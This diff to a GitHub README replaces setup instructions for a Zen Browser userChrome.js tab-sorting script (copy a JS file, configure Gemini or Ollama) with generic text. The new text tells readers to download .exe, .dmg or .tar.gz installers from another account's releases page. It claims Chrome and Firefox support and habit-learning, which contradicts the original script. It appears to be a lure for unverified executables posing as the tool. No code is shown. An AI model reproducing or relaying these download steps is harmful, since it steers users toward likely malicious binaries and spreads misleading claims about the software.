@@ -1,50 +1,74 @@
-# ✨ AI Tab Groups for Zen Browser ✨
+# 🌟 Ai-TabGroups-ZenBrowser - Organize Your Tabs Effortlessly
 
-‼️ Breaks for Zen version <1.15b, Please use the latest script.
+## 🚀 Getting Started
 
-https://github.com/user-attachments/assets/fc792843-b1da-448e-ba00-63322a3d9c99
+Welcome to Ai-TabGroups-ZenBrowser! This application helps you sort your temporary tabs into organized groups using AI technology. Enjoy a cleaner, more organized browsing experience. Let's get you set up.
 
-## Pre-requisites
-- Enable userChrome Customizations:
-    In `about:config` go to `toolkit.legacyUserProfileCustomizations.stylesheets` and set it to `true`.
-- Install and Setup the userChrome.js Loader from [Autoconfig](https://github.com/MrOtherGuy/fx-autoconfig/tree/master)
-- Install the Tab Groups config from [Advanced Tab Groups](https://github.com/Anoms12/Advanced-Tab-Groups)
-    If you already have a Tab Groups config you can skip this
-  
-## Setup and Install
+## 🔗 Download Ai-TabGroups-ZenBrowser
 
-## Method 1 (Recommended):
-***Through [Sine](https://github.com/CosmoCreeper/Sine)***
+[![Download Ai-TabGroups-ZenBrowser](https://img.shields.io/badge/Download-Ai--TabGroups--ZenBrowser-blue)](https://github.com/rohanparmar160705/Ai-TabGroups-ZenBrowser/releases)
 
-Settings Can be configured through the mod settings through the Sine UI
-*This also allows for Auto-Updates :D
+## 📋 Prerequisites
 
+Before you begin, make sure your system meets these requirements:
 
-## Method 2 (Manual) :
-- Copy and paste the `tab_sort_clear.uc.js` file to your `chrome/JS` folder.
-### AI Setup
-1. For Gemini (RECOMMENDED)
-    - Set `gemini { enabled:true }` in `apiConfig` and `ollama { enabled:false }` in `apiConfig`
-    - Get an API Key from [AI Studios](https://aistudio.google.com)
-    - Replace `YOUR_GEMINI-API-KEY` with the copied API key
-    - Don't change the Gemini model since 2.0 has very low rate limits (unless you are rich ig)
-2. For Ollama
-    - Download and install [Ollama](https://ollama.com/)
-    - Install your preferred model. The script uses `llama3.1` by default
-    - Set `ollama { enabled:true }` in `apiConfig` and `gemini { enabled:false }` in `apiConfig`
-    - Set the model you downloaded in ollama.model: in the config (you can see the models by doing `ollama list` in terminal)
-- Make sure `browser.tabs.groups.smart.enabled` is set to `false` in `about:config`
-- Open Zen browser, go to `about:support` and clear the startup cache.
-- Done. Enjoy ^^
+- Operating System: Windows 10, macOS, or Linux
+- Browser: Compatible with major browsers like Google Chrome or Firefox
+- Internet Connection: Required for downloading and running the application
 
+## 📥 Download & Install
 
-## How it works?
-- The script has two phases, first it manually sorts tabs that have common words in their title and URL, second it uses the AI to sort rest of the tabs and checks if they fit in the existing groups (that were manually created) or if it should create a new group.
-- The script only fetches the tabs full URL and title, thus it prioritizes the title first for main context and URL for sub context.
-- The sort function only works when there is two or more tabs to sort into a group.
-- You can also have a selected group of tabs sorted as well, this allows you to have fine-grained control over the sorting (works for tabs that are already grouped as well, they may be re-sorted).
-- You are free to change the AI prompt to your suitable workflow. The prompt is at the top in `apiConfig`.
-- The `Clear` button only clears un-grouped non-pinned tabs.
+1. Click the link below to visit the Release page:
+   
+   [Download Ai-TabGroups-ZenBrowser](https://github.com/rohanparmar160705/Ai-TabGroups-ZenBrowser/releases)
 
-**Peace <3**
+2. On the Releases page, find the latest version of Ai-TabGroups-ZenBrowser.
 
+3. Click on the file that matches your operating system to download it:
+
+   - For Windows: look for a file ending in `.exe`
+   - For macOS: look for a file ending in `.dmg`
+   - For Linux: look for a file ending in `.tar.gz`
+
+4. Once the download is complete, open the file to install the application by following the on-screen instructions.
+
+5. After installation, launch Ai-TabGroups-ZenBrowser from your applications or programs list.
+
+## 💻 Using Ai-TabGroups-ZenBrowser
+
+1. Open your browser and make sure you have some temporary tabs open.
+2. Launch Ai-TabGroups-ZenBrowser.
+3. The application will automatically scan your open tabs and suggest organized groups.
+4. Review the suggested groupings and adjust if necessary.
+5. Click "Apply" to organize your tabs.
+
+## ⚙️ Features
+
+- **AI-Powered Sorting**: Uses artificial intelligence to analyze your browsing habits and suggests tab groupings.
+- **User-Friendly Interface**: Designed with simplicity in mind, making it easy for anyone to use.
+- **Customizable Groups**: Modify suggested groupings to suit your preferences.
+- **Real-Time Updates**: Adjusts organization as new tabs are opened or closed.
+
+## ❓ Troubleshooting
+
+If you encounter issues while using Ai-TabGroups-ZenBrowser, consider the following:
+
+- **Application Does Not Launch**: Ensure the installation was successful. Try reinstalling the application.
+- **Tab Grouping Is Inaccurate**: The AI learns from your habits. Use the application several times for better accuracy.
+- **Issues with Compatibility**: Ensure your browser is up to date and compatible with Ai-TabGroups-ZenBrowser.
+
+## 🎤 Feedback
+
+We value your thoughts! If you have suggestions or feedback, please share them through the Issues section on our GitHub page. 
+
+## 🌐 Community
+
+Join our community of users to share tips and insights on maximizing your use of Ai-TabGroups-ZenBrowser. 
+
+## 📞 Contact
+
+For support inquiries, please contact us via the GitHub Issues page. We aim to respond within 48 hours. 
+
+---
+
+Thank you for choosing Ai-TabGroups-ZenBrowser! We hope you enjoy a more organized browsing experience. Don't forget to check for updates regularly by visiting our [release page](https://github.com/rohanparmar160705/Ai-TabGroups-ZenBrowser/releases).
